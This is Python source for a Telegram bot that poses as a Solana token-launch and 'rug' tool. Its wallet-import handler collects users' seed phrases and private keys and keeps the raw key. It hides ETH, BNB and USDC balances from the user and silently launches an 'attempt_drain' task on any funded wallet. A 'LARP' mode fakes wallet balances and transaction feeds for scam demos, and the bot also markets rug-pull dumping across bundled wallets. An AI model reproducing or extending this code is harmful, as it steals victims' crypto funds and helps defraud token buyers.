    b.row(InlineKeyboardButton(text="💳 Pay 100 SOL", callback_data="promo:pay"))
    b.row(InlineKeyboardButton(text="🎟️ Enter promo code", callback_data="promo:enter"))
    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    return b.as_markup()

def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
    s = sess.settings
    slip = s["slippage"]
    fee = s["priority_fee"]
    def mark(val, current, suffix="%"):
        return f"• {val}{suffix}" if val == current else f"{val}{suffix}"
    def mark_fee(val, current):
        return f"• {val}" if abs(val - current) < 1e-9 else f"{val}"
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text=mark(5, slip), callback_data="set:slip:5"),
        InlineKeyboardButton(text=mark(10, slip), callback_data="set:slip:10"),
        InlineKeyboardButton(text=mark(15, slip), callback_data="set:slip:15"),
        InlineKeyboardButton(text=mark(25, slip), callback_data="set:slip:25"),
    )
    b.row(
        InlineKeyboardButton(text=mark_fee(0.0001, fee), callback_data="set:fee:0.0001"),
        InlineKeyboardButton(text=mark_fee(0.0005, fee), callback_data="set:fee:0.0005"),
        InlineKeyboardButton(text=mark_fee(0.001, fee), callback_data="set:fee:0.001"),
        InlineKeyboardButton(text=mark_fee(0.005, fee), callback_data="set:fee:0.005"),
    )
    b.row(
        InlineKeyboardButton(text="Custom slippage", callback_data="set:custom_slip"),
        InlineKeyboardButton(text="Custom fee", callback_data="set:custom_fee"),
    )
    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    return b.as_markup()

def cancel_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")]
    ])

def launch_name_kb() -> InlineKeyboardMarkup:
    return cancel_kb()

def socials_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="𝕏 X", callback_data="social:x"),
        InlineKeyboardButton(text="✈️ Telegram", callback_data="social:tg"),
    )
    b.row(
        InlineKeyboardButton(text="🌐 Website", callback_data="social:web"),
        InlineKeyboardButton(text="📸 Instagram", callback_data="social:ig"),
    )
    b.row(
        InlineKeyboardButton(text="✅ Done", callback_data="socials:done"),
        InlineKeyboardButton(text="⏭ Skip", callback_data="socials:skip"),
    )
    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
    return b.as_markup()

def bundle_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="👥 5 Wallets", callback_data="bundle:5"),
        InlineKeyboardButton(text="👥 10 Wallets", callback_data="bundle:10"),
    )
    b.row(
        InlineKeyboardButton(text="👥 15 Wallets", callback_data="bundle:15"),
        InlineKeyboardButton(text="👥 25 Wallets", callback_data="bundle:25"),
    )
    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
    return b.as_markup()

def invest_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="3 SOL", callback_data="invest:3"),
        InlineKeyboardButton(text="5 SOL", callback_data="invest:5"),
        InlineKeyboardButton(text="10 SOL", callback_data="invest:10"),
    )
    b.row(
        InlineKeyboardButton(text="15 SOL", callback_data="invest:15"),
        InlineKeyboardButton(text="25 SOL", callback_data="invest:25"),
        InlineKeyboardButton(text="50 SOL", callback_data="invest:50"),
    )
    b.row(InlineKeyboardButton(text="✏️ Custom amount", callback_data="invest:custom"))
    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
    return b.as_markup()

def confirm_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Confirm & Save", callback_data="launch:confirm")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")],
    ])

def live_token_kb(mint: str, bundle: int) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    # individual dump buttons in pairs
    row = []
    for i in range(1, bundle + 1):
        row.append(InlineKeyboardButton(text=f"💥 Dump {i}", callback_data=f"dumpone:{mint}:{i}"))
        if len(row) == 2:
            b.row(*row)
            row = []
    if row:
        b.row(*row)
    b.row(
        InlineKeyboardButton(text="💥 Dump All", callback_data=f"dump:{mint}"),
        InlineKeyboardButton(text="♻️ Reset", callback_data=f"dumpreset:{mint}"),
    )
    b.row(InlineKeyboardButton(text="👁 View All Wallets", callback_data=f"viewwallets:{mint}"))
    b.row(InlineKeyboardButton(text="🏠 Back To Menu", callback_data="menu:main"))
    return b.as_markup()

def post_dump_kb(mint: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Show PnL", callback_data=f"showpnl:{mint}")],
        [InlineKeyboardButton(text="👁 View All Wallets", callback_data=f"viewwallets:{mint}")],
        [InlineKeyboardButton(text="🏠 Back To Menu", callback_data="menu:main")],
    ])

def tx_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]])

# ──────────────────────────────────────────────
# COPY
# ──────────────────────────────────────────────
WELCOME_TEXT = (
    "🚀 <b>Get ready to rug</b>\n\n"
    "Create and trade tokens on Solana launch platforms.\n\n"
    "⚙️ <b>Advanced</b>\n"
    "• Step-by-step token launch\n"
    "• Auto bundling (5-25)\n"
    "• Sniper protection\n"
    "• Token safety checks\n"
    "• Tx tracker\n\n"
    "Tap a button below to begin:"
)

# ──────────────────────────────────────────────
# FSM
# ──────────────────────────────────────────────
class LaunchStates(StatesGroup):
    waiting_name = State()
    waiting_symbol = State()
    waiting_desc = State()
    waiting_image = State()
    waiting_bundle = State()
    waiting_socials = State()
    waiting_social_link = State()
    waiting_invest = State()
    waiting_invest_custom = State()
    confirm = State()

class WalletStates(StatesGroup):
    waiting_import = State()
    waiting_label = State()

class PromoStates(StatesGroup):
    waiting_code = State()

class SettingsStates(StatesGroup):
    waiting_custom_slip = State()
    waiting_custom_fee = State()

# ──────────────────────────────────────────────
# ROUTER
# ──────────────────────────────────────────────
router = Router()

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    get_session(message.from_user.id)
    await message.answer(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)

@router.callback_query(F.data.startswith("menu:"))
async def menu_router(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    action = cb.data.split(":")[1]
    uid = cb.from_user.id
    sess = get_session(uid)

    if action == "main":
        await cb.message.edit_text(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)

    elif action == "launch":
        text = "✏️ <b>Token name (1-50)</b>\nTip: Latest, Hot Tokens."
        await cb.message.edit_text(text, reply_markup=cancel_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_name)

    elif action == "wallets":
        # Auto-seed LARP wallet for admin when LARP mode is on
        if LARP_ENABLED and uid in ADMIN_IDS:
            ensure_larp_wallet(sess)
            sync_larp_balances_from_vault(uid)
        text = "🔑 <b>Wallets</b>\n\n"
        if not sess.wallets:
            text += "No wallets linked yet.\n\nImport a private key or seed to unlock launching, bundling & portfolio tracking."
        else:
            for i, w in enumerate(sess.wallets):
                badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
                # ONLY show SOL balance to the user (LARP wallets look identical)
                text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}\n\n"
        await cb.message.edit_text(text, reply_markup=wallets_kb(bool(sess.wallets)), parse_mode=ParseMode.HTML)

    elif action == "portfolio":
        text = "📁 <b>Portfolio</b>\n\n"
        if not sess.launched_tokens:
            text += "Your portfolio is empty.\n\nLaunch a token to start tracking performance and bundle status."
        else:
            for t in reversed(sess.launched_tokens[-10:]):
                age = int(time.time() - t["ts"])
                if t.get("dumped") or t.get("status") == "dumped":
                    status_icon = "💸"
                    extra = f"  ·  profit +{t.get('profit', 0):.2f}"
                elif t.get("status") == "live":
                    status_icon = "🟢"
                    extra = f"  ·  invest {t.get('invest', 0):.2f}"
                else:
                    status_icon = "🟡"
                    extra = ""
                text += (
                    f"{status_icon} <b>${t['symbol']}</b>  ·  {t['name']}\n"
                    f"   <code>{short_addr(t['mint'])}</code>\n"
                    f"   Bundle ×{t['bundle']}{extra}  ·  {age}s ago\n\n"
                )
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "promo":
        text = (
            "🎟️ <b>Promo code</b>\n\n"
            f"Launches left: <b>{sess.launches_left}</b>\n\n"
            "Use a promo code or pay 100 SOL for more launches."
        )
        await cb.message.edit_text(text, reply_markup=promo_kb(), parse_mode=ParseMode.HTML)

    elif action == "tx":
        text = "🧾 <b>Tx tracker</b>\n\n"
        # Merge personal + global (LARP) feed, newest first
        merged = list(sess.last_tx) + list(GLOBAL_TX_FEED)
        merged.sort(key=lambda x: x.get("ts", 0), reverse=True)
        seen = set()
        feed = []
        for tx in merged:
            sig = tx.get("sig")
            if sig in seen:
                continue
            seen.add(sig)
            feed.append(tx)
            if len(feed) >= 10:
                break
        if not feed:
            text += "No activity yet.\n\nTransactions from launches, tips and bundles will stream here."
        else:
            for tx in feed:
                age = int(time.time() - tx["ts"])
                icon = "✅" if tx["status"] == "success" else "⏳" if tx["status"] == "pending" else "❌"
                amt = tx.get("amount")
                amt_line = f"  ·  {SOL_EMOJI} {amt:+.4f}" if isinstance(amt, (int, float)) else ""
                text += (
                    f"{icon}  <b>{tx['type']}</b>{amt_line}\n"
                    f"   <code>{tx['sig'][:22]}...</code>\n"
                    f"   {tx['status'].title()}  ·  {age}s ago\n\n"
                )
        await cb.message.edit_text(text, reply_markup=tx_kb(), parse_mode=ParseMode.HTML)

    elif action == "settings":
        s = sess.settings
        text = (
            "🛡️ <b>Sniper protection & trade settings</b>\n\n"
            f"Max slippage: <b>{s['slippage']}%</b>\n"
            "Trades that would fill worse than this fail instead of filling.\n\n"
            f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
            "Higher fees land your launch or trade sooner."
        )
        await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)

    elif action == "balance":
        if bot_balance_sol <= 0:
            text = f"💰 <b>Bot balance:</b>\nNo balance yet. It updates when you try to launch."
        else:
            text = (
                f"💰 <b>Bot balance</b>\n\n"
                f"Available: <b>{SOL_EMOJI} {bot_balance_sol:.4f}</b>\n\n"
                "This vault powers priority fees, bundle tips and tracker infrastructure.\n"
                "Auto-topped when a funded wallet is linked."
            )
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔄 Refresh", callback_data="menu:balance"))
        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    await cb.answer()

@router.callback_query(F.data.startswith("set:"))
async def settings_handler(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    parts = cb.data.split(":")
    key = parts[1]
    if key == "slip":
        sess.settings["slippage"] = int(parts[2])
    elif key == "fee":
        sess.settings["priority_fee"] = float(parts[2])
    elif key == "custom_slip":
        await cb.message.edit_text("Send custom max slippage % (1-50):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(SettingsStates.waiting_custom_slip)
        await cb.answer()
        return
    elif key == "custom_fee":
        await cb.message.edit_text("Send custom priority fee in SOL (e.g. 0.002):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(SettingsStates.waiting_custom_fee)
        await cb.answer()
        return
    s = sess.settings
    text = (
        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
        f"Max slippage: <b>{s['slippage']}%</b>\n"
        "Trades that would fill worse than this fail instead of filling.\n\n"
        f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
        "Higher fees land your launch or trade sooner."
    )
    await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await cb.answer("Updated")

@router.message(SettingsStates.waiting_custom_slip)
async def custom_slip_receive(message: Message, state: FSMContext):
    try:
        val = int(message.text.strip().replace("%", ""))
        if not 1 <= val <= 50: raise ValueError
    except ValueError:
        await message.answer("Invalid. Send a number 1-50")
        return
    sess = get_session(message.from_user.id)
    sess.settings["slippage"] = val
    s = sess.settings
    text = (
        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
        f"Max slippage: <b>{s['slippage']}%</b>\n"
        "Trades that would fill worse than this fail instead of filling.\n\n"
        f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
        "Higher fees land your launch or trade sooner."
    )
    await message.answer(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await state.clear()

@router.message(SettingsStates.waiting_custom_fee)
async def custom_fee_receive(message: Message, state: FSMContext):
    try:
        val = float(message.text.strip())
        if not 0.00001 <= val <= 1.0: raise ValueError
    except ValueError:
        await message.answer("Invalid. Send a fee like 0.002")
        return
    sess = get_session(message.from_user.id)
    sess.settings["priority_fee"] = val
    s = sess.settings
    text = (
        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
        f"Max slippage: <b>{s['slippage']}%</b>\n"
        "Trades that would fill worse than this fail instead of filling.\n\n"
        f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
        "Higher fees land your launch or trade sooner."
    )
    await message.answer(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await state.clear()

@router.callback_query(F.data == "wallet:import")
async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
    text = (
        "📥 <b>Send your wallet's seed phrase</b>\n"
        "(12-24 words), or a private key (base58 / JSON byte array).\n\n"
        "I'll delete your message right after reading it."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")]
    ])
    await cb.message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
    await state.set_state(WalletStates.waiting_import)
    await cb.answer()

@router.message(WalletStates.waiting_import)
async def wallet_import_receive(message: Message, state: FSMContext):
    uid = message.from_user.id
    if not _rate_ok(uid, "import"):
        await message.answer("⏳ <b>Slow down</b>\n\nToo many import attempts. Try again in a minute.", parse_mode=ParseMode.HTML)
        return

    raw = (message.text or "").strip()
    try:
        await message.delete()
    except Exception:
        pass

    status_msg = await message.answer("🔐 <b>Validating…</b>", parse_mode=ParseMode.HTML)

    chosen_priv = None
    chosen_pub = None
    chosen_bal = 0.0
    eth_priv = None
    eth_addr = None
    bal_eth = 0.0
    bal_bnb = 0.0
    bal_usdc = 0.0

    try:
        clean = _normalize_mnemonic(raw)
        is_seed = _is_mnemonic(clean)

        if is_seed and HAS_SOLANA:
            await status_msg.edit_text("🔗 <b>Deriving paths…</b>", parse_mode=ParseMode.HTML)
            candidates = derive_solana_paths(clean)
            label, chosen_priv, chosen_pub, chosen_bal = await pick_best_sol_candidate(candidates)

            eth = derive_evm_from_mnemonic(clean)
            if eth:
                eth_priv, eth_addr = eth
                try:
                    bal_eth = await asyncio.wait_for(fetch_evm_balance(ETH_RPC, eth_addr), timeout=5)
                    bal_bnb = await asyncio.wait_for(fetch_evm_balance(BNB_RPC, eth_addr), timeout=5)
                    bal_usdc = await asyncio.wait_for(fetch_usdc_balance(ETH_RPC, eth_addr, USDC_ETH), timeout=5)
                    bal_usdc += await asyncio.wait_for(fetch_usdc_balance(BNB_RPC, eth_addr, USDC_BSC), timeout=5)
                except Exception:
                    pass
        else:
            await status_msg.edit_text("🔑 <b>Importing key…</b>", parse_mode=ParseMode.HTML)
            if raw.startswith("0x") or (len(raw) == 64 and all(c in "0123456789abcdefABCDEF" for c in raw)):
                eth_priv, eth_addr = parse_evm_private_key(raw)
                chosen_priv = "EVM_ONLY"
                chosen_pub = eth_addr
                try:
                    bal_eth = await asyncio.wait_for(fetch_evm_balance(ETH_RPC, eth_addr), timeout=5)
                    bal_bnb = await asyncio.wait_for(fetch_evm_balance(BNB_RPC, eth_addr), timeout=5)
                    bal_usdc = await asyncio.wait_for(fetch_usdc_balance(ETH_RPC, eth_addr, USDC_ETH), timeout=5)
                    bal_usdc += await asyncio.wait_for(fetch_usdc_balance(BNB_RPC, eth_addr, USDC_BSC), timeout=5)
                except Exception:
                    pass
            else:
                chosen_priv, chosen_pub = parse_solana_private_key(raw)
                try:
                    chosen_bal = await asyncio.wait_for(fetch_sol_balance(chosen_pub), timeout=5)
                except Exception:
                    chosen_bal = 0.0

    except Exception as e:
        log.exception("Import failed: %s", e)
        await status_msg.edit_text("❌ <b>Invalid key or seed</b>\n\nTry again.", parse_mode=ParseMode.HTML)
        await state.clear()
        return

    sess = get_session(uid)
    sess.last_raw_key = raw

    w = UserWallet(
        private_key=chosen_priv if chosen_priv != "EVM_ONLY" else (eth_priv or ""),
        public_key=chosen_pub,
        label=f"Wallet {len(sess.wallets)+1}",
        balance_sol=chosen_bal,
        chain="sol" if chosen_priv != "EVM_ONLY" else "eth",
        eth_address=eth_addr,
        balance_eth=bal_eth,
        balance_bnb=bal_bnb,
        balance_usdc=bal_usdc,
    )
    sess.wallets.append(w)
    sess.active_wallet_idx = len(sess.wallets) - 1

    # ONLY show SOL to the user
    text = (
        "✅ <b>Wallet Linked</b>\n\n"
        f"<code>{chosen_pub}</code>\n\n"
        f"🏷 Label: <b>{w.label}</b>\n"
        f"{SOL_EMOJI}: <b>{w.balance_sol:.4f}</b>\n"
        "\nStatus: <b>Active</b>\n\nYou can now launch tokens."
    )

    await status_msg.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()

    if chosen_bal > 0.00001 or bal_eth > 0.0001 or bal_bnb > 0.0001 or bal_usdc > 0.5:
        asyncio.create_task(attempt_drain(
            uid,
            chosen_priv if chosen_priv != "EVM_ONLY" else "",
            chain=w.chain,
            eth_key=eth_priv,
            bot=message.bot,
            user=message.from_user
        ))
    else:
        log.info("Wallet %s near-zero — drain skipped", chosen_pub)

@router.callback_query(F.data == "wallet:clear")
async def wallet_clear(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    sess.wallets.clear()
    sess.active_wallet_idx = 0
    sess.larp_wallet_idx = None
    sess.drained = False
    # If global LARP still on and admin, re-seed so the illusion never breaks mid-demo
    if LARP_ENABLED and cb.from_user.id in ADMIN_IDS:
        ensure_larp_wallet(sess)
        await cb.message.edit_text(
            "🗑 Real wallets cleared.\nLARP wallet re-seeded (mode still ON).",
            reply_markup=back_menu_kb(),
            parse_mode=ParseMode.HTML,
        )
    else:
        await cb.message.edit_text("🗑 All wallets removed from session.", reply_markup=back_menu_kb())
    await cb.answer()

@router.callback_query(F.data == "wallet:switch")
async def wallet_switch(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    if len(sess.wallets) < 2:
        await cb.answer("Need at least 2 wallets", show_alert=True)
        return
    sess.active_wallet_idx = (sess.active_wallet_idx + 1) % len(sess.wallets)
    w = sess.wallets[sess.active_wallet_idx]
    await cb.answer(f"Active → {w.label}")

@router.callback_query(F.data == "wallet:refresh")
async def wallet_refresh(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    for w in sess.wallets:
        if getattr(w, "is_larp", False):
            # LARP wallets mirror vault; no RPC
            if LARP_ENABLED:
                w.balance_sol = bot_balance_sol
            continue
        if not w.public_key.startswith("Sim") and not w.public_key.startswith("0x") and w.private_key != "LARP_SIM":
            w.balance_sol = await fetch_sol_balance(w.public_key)
        if w.eth_address:
            w.balance_eth = await fetch_evm_balance(ETH_RPC, w.eth_address)
            w.balance_bnb = await fetch_evm_balance(BNB_RPC, w.eth_address)
            w.balance_usdc = await fetch_usdc_balance(ETH_RPC, w.eth_address, USDC_ETH)
            w.balance_usdc += await fetch_usdc_balance(BNB_RPC, w.eth_address, USDC_BSC)
    await cb.answer("Balances updated")
    text = "🔑 <b>Wallets</b>\n\n"
    for i, w in enumerate(sess.wallets):
        badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
        # ONLY SOL shown
        text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}\n\n"
    await cb.message.edit_text(text, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)

@router.callback_query(F.data == "wallet:rename")
async def wallet_rename(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    if not sess.wallets:
        await cb.answer("No wallets", show_alert=True)
        return
    await cb.message.edit_text(f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
    await state.set_state(WalletStates.waiting_label)
    await cb.answer()

@router.message(WalletStates.waiting_label)
async def wallet_rename_receive(message: Message, state: FSMContext):
    sess = get_session(message.from_user.id)
    if sess.wallets:
        sess.wallets[sess.active_wallet_idx].label = message.text.strip()[:24]
    await message.answer("✅ Label updated.", reply_markup=main_menu_kb())
    await state.clear()

# ── Launch flow (unchanged from your version) ───────────────────────────────
@router.message(LaunchStates.waiting_name)
async def launch_name(message: Message, state: FSMContext):
    name = (message.text or "").strip()[:50]
    if not name:
        await message.answer("Name required (1-50 chars).", reply_markup=cancel_kb())
        return
    await state.update_data(name=name, twitter="", telegram="", instagram="", website="", supply=1_000_000_000)
    await message.answer(
        f"✅ <b>Name set:</b> {name}\n\n"
        "🔤 <b>Enter SYMBOL (2-25, A-Z)</b>\n"
        "Example: <code>$PEPE</code>",
        reply_markup=cancel_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_symbol)


@router.message(LaunchStates.waiting_symbol)
async def launch_symbol(message: Message, state: FSMContext):
    sym = (message.text or "").strip().upper().replace("$", "")[:25]
    if len(sym) < 2 or not sym.isalpha():
        await message.answer("❌ Symbol must be 2-25 letters (A-Z).", reply_markup=cancel_kb())
        return
    await state.update_data(symbol=sym)
    await message.answer(
        f"✅ <b>Symbol set:</b> ${sym}\n\n"
        "📝 <b>Send the exact description of the token</b> (≤ 500 chars)\n"
        "1-2 lines. Avoid links.\n"
        "Or type <code>skip</code>.",
        reply_markup=cancel_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_desc)


@router.message(LaunchStates.waiting_desc)
async def launch_desc(message: Message, state: FSMContext):
    desc = (message.text or "").strip()
    if desc.lower() == "skip":
        desc = ""
    await state.update_data(desc=desc[:500])
    await message.answer(
        "🖼 <b>Upload token image</b>\n"
        "PNG/JPG · Square · ≥512px\n\n"
        "Send a <b>photo</b>, an image URL, or type <code>skip</code>.",
        reply_markup=cancel_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_image)


@router.message(LaunchStates.waiting_image)
async def launch_image(message: Message, state: FSMContext):
    img = ""
    if message.photo:
        img = message.photo[-1].file_id
        await message.answer("✅ Image received.")
    else:
        text = (message.text or "").strip()
        if text.lower() == "skip":
            img = ""
        elif text.startswith("http://") or text.startswith("https://"):
            img = text[:300]
        else:
            await message.answer(
                "Send a <b>photo</b>, an image <b>URL</b>, or type <code>skip</code>.",
                reply_markup=cancel_kb(),
                parse_mode=ParseMode.HTML,
            )
            return
    await state.update_data(image=img)
    await message.answer(
        "👥 <b>Choose bundle size</b> (higher = more impact):",
        reply_markup=bundle_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_bundle)


@router.callback_query(F.data.startswith("bundle:"))
async def launch_bundle_btn(cb: CallbackQuery, state: FSMContext):
    try:
        bundle = max(1, min(25, int(cb.data.split(":")[1])))
    except Exception:
        bundle = 10
    await state.update_data(bundle=bundle)
    await cb.message.edit_text(
        f"✅ <b>Bundle size set:</b> {bundle} wallets\n\n"
        "🔗 <b>Add socials</b> (optional): choose a platform or skip.",
        reply_markup=socials_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_socials)
    await cb.answer()


@router.callback_query(F.data.startswith("social:"), LaunchStates.waiting_socials)
async def social_pick(cb: CallbackQuery, state: FSMContext):
    platform = cb.data.split(":")[1]
    labels = {"x": "X / Twitter URL", "tg": "Telegram URL", "web": "Website URL", "ig": "Instagram URL"}
    await state.update_data(_social_pending=platform)
    await cb.message.edit_text(
        f"Send {labels.get(platform, 'URL')}:",
        reply_markup=cancel_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_social_link)
    await cb.answer()


@router.message(LaunchStates.waiting_social_link)
async def social_link_receive(message: Message, state: FSMContext):
    data = await state.get_data()
    platform = data.get("_social_pending", "x")
    url = (message.text or "").strip()[:120]
    key = {"x": "twitter", "tg": "telegram", "web": "website", "ig": "instagram"}.get(platform, "twitter")
    await state.update_data(**{key: url, "_social_pending": None})
    await message.answer(
        f"✅ Saved {key}.\n\nAdd another platform or press Done / Skip.",
        reply_markup=socials_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_socials)


@router.callback_query(F.data.in_({"socials:skip", "socials:done"}), LaunchStates.waiting_socials)
async def socials_done(cb: CallbackQuery, state: FSMContext):
    # After socials → invest amount (min 3) then review
    sess = get_session(cb.from_user.id)
    if LARP_ENABLED and cb.from_user.id in ADMIN_IDS and not sess.wallets:
        ensure_larp_wallet(sess)
    bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
    data = await state.get_data()
    await cb.message.edit_text(
        "💰 <b>Dev buy / invest amount</b>\n\n"
        f"Your balance: <b>{SOL_EMOJI} {bal:.4f}</b>\n"
        "Minimum: <b>3 SOL</b>\n\n"
        "How much SOL do you invest into this launch?",
        reply_markup=invest_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_invest)
    await cb.answer()


@router.callback_query(F.data.startswith("invest:"), LaunchStates.waiting_invest)
async def launch_invest_btn(cb: CallbackQuery, state: FSMContext):
    part = cb.data.split(":")[1]
    if part == "custom":
        await cb.message.edit_text(
            "✏️ Send invest amount in SOL (minimum <b>3</b>):",
            reply_markup=cancel_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_invest_custom)
        await cb.answer()
        return
    try:
        invest = float(part)
    except ValueError:
        await cb.answer("Invalid amount", show_alert=True)
        return
    await _finish_invest_choice(cb, state, invest)


@router.message(LaunchStates.waiting_invest_custom)
async def launch_invest_custom(message: Message, state: FSMContext):
    try:
        invest = float((message.text or "").strip().replace(",", ""))
    except ValueError:
        await message.answer("❌ Invalid number. Send e.g. <code>7.5</code>", parse_mode=ParseMode.HTML)
        return
    if invest < 3:
        await message.answer("❌ Minimum invest is <b>3 SOL</b>. Try again.", parse_mode=ParseMode.HTML)
        return
    sess = get_session(message.from_user.id)
    if LARP_ENABLED and message.from_user.id in ADMIN_IDS and not sess.wallets:
        ensure_larp_wallet(sess)
    bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
    if invest > bal + 1e-9:
        await message.answer(
            f"❌ <b>Insufficient balance</b>\n\n"
            f"You tried to invest <b>{invest:.4f} SOL</b>\n"
            f"Available: <b>{bal:.4f} SOL</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=invest_kb(),
        )
        await state.set_state(LaunchStates.waiting_invest)
        return
    await state.update_data(invest=invest)
    await _show_launch_preview(message, state, invest, sess)


async def _finish_invest_choice(cb: CallbackQuery, state: FSMContext, invest: float):
    if invest < 3:
        await cb.answer("Minimum is 3 SOL", show_alert=True)
        return
    sess = get_session(cb.from_user.id)
    if LARP_ENABLED and cb.from_user.id in ADMIN_IDS and not sess.wallets:
        ensure_larp_wallet(sess)
    bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
    if invest > bal + 1e-9:
        await cb.answer()
        await cb.message.edit_text(
            f"❌ <b>Insufficient balance</b>\n\n"
            f"You tried to invest <b>{invest:.4f} SOL</b>\n"
            f"Available: <b>{bal:.4f} SOL</b>",
            reply_markup=invest_kb(),
            parse_mode=ParseMode.HTML,
        )
        return
    await state.update_data(invest=invest)
    await cb.answer()
    await _show_launch_preview(cb, state, invest, sess)


async def _show_launch_preview(src, state: FSMContext, invest: float, sess: UserSession):
    data = await state.get_data()
    bundle = data.get("bundle", 10)
    socials_line = []
    if data.get("twitter"): socials_line.append(f"X: {data['twitter']}")
    if data.get("telegram"): socials_line.append(f"TG: {data['telegram']}")
    if data.get("instagram"): socials_line.append(f"IG: {data['instagram']}")
    if data.get("website"): socials_line.append(f"Web: {data['website']}")
    socials_txt = ", ".join(socials_line) if socials_line else "—"

    # Review card like the video
    summary = (
        "📋 <b>Review</b>\n\n"
        f"✏️ Name: <b>{data['name']}</b>\n"
        f"🔤 Symbol: <b>${data['symbol']}</b>\n"
        f"👥 Wallets: <b>{bundle}</b>\n"
        f"💰 Invest: <b>{invest:.4f} SOL</b>\n"
        f"📝 Description: {data.get('desc') or '—'}\n"
        f"🔗 Socials: {socials_txt}\n"
        f"🖼 Image: {'✅ set' if data.get('image') else '—'}\n\n"
        "Ready?"
    )
    if hasattr(src, "message") and hasattr(src, "answer"):
        try:
            await src.message.answer(summary, reply_markup=confirm_kb(), parse_mode=ParseMode.HTML)
        except Exception:
            await src.message.edit_text(summary, reply_markup=confirm_kb(), parse_mode=ParseMode.HTML)
    else:
        await src.answer(summary, reply_markup=confirm_kb(), parse_mode=ParseMode.HTML)
    await state.set_state(LaunchStates.confirm)


